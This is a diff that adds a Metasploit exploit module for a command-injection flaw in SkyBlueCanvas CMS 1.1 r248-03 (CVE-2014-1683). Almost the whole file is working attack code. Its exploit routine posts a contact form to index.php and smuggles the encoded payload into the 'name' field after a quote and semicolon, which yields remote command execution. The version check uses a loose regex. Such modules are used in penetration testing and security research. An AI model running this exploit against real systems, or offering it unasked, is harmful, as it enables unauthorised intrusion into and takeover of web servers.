@@ -1,0 +1,94 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'SkyBlueCanvas CMS Remote Code Execution',
+      'Description'    => %q{
+        This module exploits an arbitrary command execution vulnerability
+        in SkyBlueCanvas CMS version 1.1 r248-03 and below.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Scott Parish', # Vulnerability discovery and exploit
+          'xistence <xistence[at]0x90.nl>' # Metasploit Module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2014-1683'],
+          ['OSVDB', '102586'],
+          ['BID', '65129'],
+          ['EDB', '31183'],
+          ['URL', 'http://packetstormsecurity.com/files/124948/SkyBlueCanvas-CMS-1.1-r248-03-Command-Injection.html']
+        ],
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          # Arbitrary big number. The payload gets sent as an HTTP
+          # response body, so really it's unlimited
+          'Space'       => 262144, # 256k
+          'DisableNops' => true,
+          'Compat' =>
+            {
+              'ConnectionType' => 'find',
+              'PayloadType'    => 'cmd',
+              'RequiredCmd'    => 'generic perl ruby bash telnet python'
+            }
+        },
+      'Platform'       => %w{ unix },
+      'Targets'        =>
+        [
+          ['SkyBlueCanvas 1.1 r248', {}]
+        ],
+      'Arch'           => ARCH_CMD,
+      'DisclosureDate' => 'Jan 28 2014',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI',[true, "The path to the SkyBlueCanvas CMS installation", "/"]),
+      ],self.class)
+  end
+
+  def check
+    uri = normalize_uri(target_uri.path.to_s, "index.php")
+
+    res = send_request_raw('uri' => uri)
+
+    if res and res.body =~ /[1.1 r248]/
+      vprint_good("#{peer} - SkyBlueCanvas CMS 1.1 r248-xx found")
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    uri = normalize_uri(target_uri.path.to_s, "index.php")
+
+    send_request_cgi({
+      'method'  => 'POST',
+      'uri'     => uri,
+      'vars_get' => { 'pid' => '4' },
+      'vars_post' =>
+        {
+          'cid' => '3',
+          'name' => "#{rand_text_alphanumeric(10)}\";#{payload.encoded};",
+          'email' => rand_text_alphanumeric(10),
+          'subject' => rand_text_alphanumeric(10),
+          'message' => rand_text_alphanumeric(10),
+          'action' => 'Send'
+        }
+    })
+  end
+end
